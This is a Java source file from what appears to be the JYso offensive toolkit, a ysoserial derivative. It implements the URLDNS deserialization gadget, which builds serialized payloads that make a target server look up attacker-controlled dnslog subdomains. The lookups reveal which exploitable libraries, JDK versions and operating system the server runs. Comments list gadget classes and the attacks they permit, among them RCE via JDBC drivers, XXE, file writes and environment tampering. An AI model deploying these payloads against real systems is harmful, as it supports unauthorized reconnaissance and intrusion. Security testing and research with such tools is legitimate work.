package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

/**
 * A blog post with more details about this gadget chain is at the url below:
 * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 * <p>
 * This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 * posting describing how he modified the Java Commons Collections gadget
 * in ysoserial to open a URL. This takes the same idea, but eliminates
 * the dependency on Commons Collections and does a DNS lookup with just
 * standard JDK classes.
 * <p>
 * The Java URL class has an interesting property on its equals and
 * hashCode methods. The URL class will, as a side effect, do a DNS lookup
 * during a comparison (either equals or hashCode).
 * <p>
 * As part of deserialization, HashMap calls hashCode on each key that it
 * deserializes, so using a Java URL object as a serialized key allows
 * it to trigger a DNS lookup.
 * <p>
 * Gadget Chain:
 * HashMap.readObject()
 * HashMap.putVal()
 * HashMap.hash()
 * URL.hashCode()
 */
@Dependencies()
@Authors({Authors.GEBL})
public class URLDNS implements ObjectPayload<Object> {
    public static String[] defaultClass = new String[]{
            "CommonsCollections13567",
            "CommonsCollections24",
            "CommonsBeanutils2",
            "C3P0",
            "AspectJWeaver",
            "bsh",
            "Groovy",
            "Becl",
            "DefiningClassLoader",
            "Jdk7u21",
            "JRE8u20",
            "ROME",
            "Fastjson",
            "Jackson",
            "SpringAOP",
            "winlinux",
            "jdk17_22",
            "jdk9_22",
            "jdk6_8",
            "jdk6_11",
            "jdk9_10",
    };

    public static String[] jndidefaultclass = {
            //"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",//知名getter=classloader,jdk默认就有

            "org.apache.naming.factory.BeanFactory",//最经典的ObjectFactory,有它+低版本tomcat意味着可以执行单String方法
            "org.apache.catalina.filters.CsrfPreventionFilter$NonceCache",//tomcat9.0.63/8.5.79高版本才有的类,有这个代表无法再用BeanFactory的forceString
            "javax.el.ELProcessor",//和BeanFactory最经典的配合
            //"groovy.lang.GroovyShell",//有Groovy所以可以省略了
            //"groovy.lang.GroovyClassLoader",//有Groovy所以可以省略了
            "org.yaml.snakeyaml.Yaml",//知名YAML序列化,可以跟BeanFactory配合
            "com.thoughtworks.xstream.XStream",//知名XML序列化,可以跟BeanFactory配合
            //"org.xmlpull.v1.XmlPullParserException",//XStream依赖
            //"org.xmlpull.mxp1.MXParser",//XStream依赖
            "org.mvel2.sh.ShellSession",//mvel语法,可以跟BeanFactory配合
            //"com.sun.glass.utils.NativeLibLoader",//加载dll或者so,jdk默认就有

            "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory",//高版本tomcat和低版本tomcat没有forceString时的替代类,和BeanFactory一样只能调setter,但BeanFactory会检测setter所对应的属性
            "org.apache.commons.configuration.SystemConfiguration",//配合GenericNamingResourcesFactory可以篡改jdk环境变量
            "org.apache.commons.configuration2.SystemConfiguration",//配合GenericNamingResourcesFactory可以篡改jdk环境变量
            "org.apache.groovy.util.SystemUtil",//groovy >= 3.0才有,配合GenericNamingResourcesFactory可以篡改jdk环境变量
            "org.apache.batik.swing.JSVGCanvas",//远程加载svg造成XSS,XXE,RCE

            "org.apache.catalina.users.MemoryUserDatabaseFactory",//配合UserDatabase可以XXE,写文件
            "org.apache.catalina.UserDatabase",//配合MemoryUserDatabaseFactory可以XXE,写文件

            "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",//以下均为DataSourceFactory,可以造成jdbc
            "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
            "org.apache.commons.dbcp.BasicDataSourceFactory",
            //"org.apache.commons.pool.KeyedObjectPoolFactory",//commons-dbcp1依赖
            "org.apache.commons.dbcp2.BasicDataSourceFactory",
            //"org.apache.commons.pool2.PooledObjectFactory",//commons-dbcp2依赖
            "org.apache.tomcat.jdbc.pool.DataSourceFactory",
            //"org.apache.juli.logging.LogFactory",//tomcat-jdbc依赖
            "com.alibaba.druid.pool.DruidDataSourceFactory",
            "com.zaxxer.hikari.HikariJNDIFactory",
            //"org.slf4j.LoggerFactory",//HikariCP依赖
            "org.h2.Driver",//h2 jdbc,可以RCE
            "org.postgresql.Driver",//postgresql,可以远程加载XML执行SPEL,可以写文件
            "org.springframework.context.support.ClassPathXmlApplicationContext",//postgresql RCE依赖spring环境
            "com.mysql.jdbc.Driver",//mysql,可以二次反序列化,可以读文件,可以XXE
            "com.mysql.cj.jdbc.Driver",
            "com.mysql.fabric.jdbc.FabricMySQLDriver",
            "oracle.jdbc.driver.OracleDriver",//oracle,可以带出机器用户名
            "com.ibm.db2.jcc.DB2Driver",//db2,可以写文件
            "COM.ibm.db2.jcc.DB2Driver",

            "com.ibm.ws.webservices.engine.client.ServiceFactory",//WebSphere的ObjectFactory,可以远程加载jar,很少用到
            "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",


            "oracle.ucp.jdbc.PoolDataSourceImpl",//反序列化转getter(getConnection)转jdbc(h2)转所需要的DataSource中转类,weblogic依赖
            //"com.mchange.v2.c3p0.DriverManagerDataSource",//有C3P0所以可以省略了
            //"com.mchange.v2.c3p0.test.FreezableDriverManagerDataSource",//有C3P0所以可以省略了
            //"com.alibaba.druid.pool.xa.DruidXADataSource",//有com.alibaba.druid.pool.DruidDataSourceFactory所以可以省略了
            "org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl",//hibernate-core-4.x,比较低版本才有的类

    };

    public static List<Object> list = new LinkedList();

    public static Object getURLDNSGadget(String urls, String clazzName) throws Exception {
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        URL                     url     = new URL("http://" + urls);
        Field                   f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, Integer.valueOf(0));
        Class<?> clazz = null;

        if (clazzName != null) {
            try {
                clazz = com.qi4l.JYso.gadgets.utils.Utils.makeClass(clazzName);
            } catch (Exception e) {
                clazz = Class.forName(clazzName);
            }
        }

        hashMap.put(url, clazz);
        f.set(url, Integer.valueOf(-1));
        return hashMap;
    }

    public static void setList(String clazzName, String dnsLog) throws Exception {


        switch (clazzName) {
            case "CommonsCollections13567":
                //CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
                Object cc31or321 = getURLDNSGadget("cc31or321." + dnsLog, "org.apache.commons.collections.functors.ChainedTransformer");
                Object cc322 = getURLDNSGadget("cc322." + dnsLog, "org.apache.commons.collections.ExtendedProperties$1");
                list.add(cc31or321);
                list.add(cc322);
                break;
            case "CommonsCollections24":
                //CommonsCollections2/4链,需要4-4.0版本
                Object cc40 = getURLDNSGadget("cc40." + dnsLog, "org.apache.commons.collections4.functors.ChainedTransformer");
                Object cc41 = getURLDNSGadget("cc41." + dnsLog, "org.apache.commons.collections4.FluentIterable");
                list.add(cc40);
                list.add(cc41);
                break;
            case "CommonsBeanutils2":
                //CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
                Object cb17 = getURLDNSGadget("cb17." + dnsLog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
                Object cb18x = getURLDNSGadget("cb18x." + dnsLog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
                Object cb19x = getURLDNSGadget("cb19x." + dnsLog, "org.apache.commons.beanutils.BeanIntrospectionData");
                list.add(cb17);
                list.add(cb18x);
                list.add(cb19x);
                break;
            case "C3P0":
                //c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
                Object c3p092x = getURLDNSGadget("c3p092x." + dnsLog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
                Object c3p095x = getURLDNSGadget("c3p095x." + dnsLog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
                list.add(c3p092x);
                list.add(c3p095x);
                break;
            case "AspectJWeaver":
                //aspectjweaver,需要cc31
                Object ajw = getURLDNSGadget("ajw." + dnsLog, "org.aspectj.weaver.tools.cache.SimpleCache");
                list.add(ajw);
                break;
            case "bsh":
                //bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
                Object bsh20b4 = getURLDNSGadget("bsh20b4." + dnsLog, "bsh.CollectionManager$1");
                Object bsh20b5 = getURLDNSGadget("bsh20b5." + dnsLog, "bsh.engine.BshScriptEngine");
                Object bsh20b6 = getURLDNSGadget("bsh20b6." + dnsLog, "bsh.collection.CollectionIterator$1");
                list.add(bsh20b4);
                list.add(bsh20b5);
                list.add(bsh20b6);
                break;
            case "Groovy":
                //Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
                Object groovy1702311 = getURLDNSGadget("groovy1702311." + dnsLog, "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet");
                Object groovy24x = getURLDNSGadget("groovy24x." + dnsLog, "groovy.lang.Tuple2");
                Object groovy244 = getURLDNSGadget("groovy244." + dnsLog, "org.codehaus.groovy.runtime.dgm$1170");
                list.add(groovy1702311);
                list.add(groovy24x);
                list.add(groovy244);
                break;
            case "Becl":
                //Becl,JDK<8u251
                Object becl = getURLDNSGadget("becl." + dnsLog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
                list.add(becl);
                break;
            case "Jdk7u21":
                //JDK<=7u21
                Object Jdk7u21 = getURLDNSGadget("Jdk7u21." + dnsLog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
                list.add(Jdk7u21);
                break;
            case "JRE8u20":
                //7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
                Object JRE8u20 = getURLDNSGadget("JRE8u20." + dnsLog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
                list.add(JRE8u20);
                break;
            case "ROME":
                //rome <= 1.11.1
                Object rome1000 = getURLDNSGadget("rome1000." + dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
                Object rome1111 = getURLDNSGadget("rome1111." + dnsLog, "com.rometools.rome.feed.impl.ObjectBean");
                list.add(rome1000);
                list.add(rome1111);
                break;
            case "Fastjson":
                Object fastjson = getURLDNSGadget("fastjson." + dnsLog, "com.alibaba.fastjson.JSONArray");
                list.add(fastjson);
                break;
            case "Jackson":
                //jackson-databind>=2.10.0存在一个链
                //此链实战中有50%概率触发getStylesheetDOM导致不成功,因此需要org.springframework.aop.framework.JdkDynamicAopProxy封装,这个类的jar包和springAOP一样
                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.NodeSerialization");
                list.add(jackson2100);
                break;
            case "SpringAOP":
                //fastjon/jackson两个链触发toString的变种,都需要springAOP
                Object springAOP = getURLDNSGadget("SpringAOP." + dnsLog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
                list.add(springAOP);
                break;
            case "winlinux":
                //windows/linux版本判断
                Object linux = getURLDNSGadget("linux." + dnsLog, "sun.awt.X11.AwtGraphicsConfigData");
                Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
                list.add(linux);
                list.add(windows);
                break;
            case "jdk17_22":
                Object jdk17_22 = getURLDNSGadget("jdk17_22." + dnsLog, "jdk.internal.util.random.RandomSupport");
                list.add(jdk17_22);
                break;
            case "jdk9_22":
                Object jdk9_22 = getURLDNSGadget("jdk9_22." + dnsLog, "jdk.internal.misc.Unsafe");
                list.add(jdk9_22);
                break;
            case "jdk6_8":
                Object jdk6_8 = getURLDNSGadget("jdk6_8." + dnsLog, "sun.misc.BASE64Decoder");
                list.add(jdk6_8);
                break;
            case "jdk6_11":
                Object jdk6_11 = getURLDNSGadget("jdk6_11." + dnsLog, "com.sun.awt.SecurityWarning");
                list.add(jdk6_11);
                break;
            case "jdk9_10":
                Object jdk9_10 = getURLDNSGadget("jdk9_10." + dnsLog, "jdk.incubator.http.HttpClient");
                list.add(jdk9_10);
                break;

            case "all":
                for (int i = 0; i < defaultClass.length; i++) {
                    setList(defaultClass[i], dnsLog);
                }
                break;
            case "jndiall":
                for (int i = 0; i < jndidefaultclass.length; i++) {
                    setList(jndidefaultclass[i], dnsLog);
                }
                break;
            default:
                Object hm = getURLDNSGadget(clazzName.replace(".", "_").replace("$", "_") + "." + dnsLog, clazzName);
                list.add(hm);
                break;
        }
    }

    public Object getObject(String command) throws Exception {

        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
        }

        String tYPE = command.substring(0, sep);
        String url  = command.substring(sep + 1);

        switch (tYPE) {
            // common 时会测试不常被黑名单禁用的类
            case "common":
                setList("CommonsBeanutils2", url);
                setList("C3P0", url);
                setList("AspectJWeaver", url);
                setList("bsh", url);
                setList("winlinux", url);
                break;

            // all 会测试全部类
            case "all":
                setList("all", url);
                break;

            // jndi 时会测试JNDI相关的类
            case "jndiall":
                setList("jndiall", url);
                break;

            case "null":
                return getURLDNSGadget(url, null);
            // 默认指定类
            default:
                setList(tYPE, url);
        }

        return list;
    }
}
